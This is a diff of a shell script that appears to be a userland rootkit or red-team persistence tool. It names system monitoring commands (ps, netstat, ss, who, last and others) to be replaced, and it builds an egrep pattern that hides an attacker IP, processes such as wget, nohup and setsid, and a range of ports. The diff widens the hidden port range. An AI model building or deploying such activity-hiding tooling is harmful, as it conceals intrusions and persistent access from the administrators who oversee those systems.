@@ -10,11 +10,11 @@
 #
 
 IP="10.10.2.4"
-COMMANDS="ps top ss netstat lsof who w last cat ls grep" # don't replace egrep, causes infinite recursion
+COMMANDS="ps top ss netstat lsof who w last cat ls grep" # don't replace grep or egrep, causes infinite recursion and errors with my other scripts
 
 IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
 PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|nohup|setsid|wget|flock"
-PORTS="59000|59001|59002|59003|59004|59005|59006|59007|59008|59009|60000|60001|60002|60003|60004|60005|60006|60007|60008|60009"
+PORTS="59000|59001|59002|59003|59004|59005|59006|59007|59008|59009|60...|61..."
 HIDE_ME="$IP_ESCAPED|$PROCESSES|$PORTS"
 
 # Colors
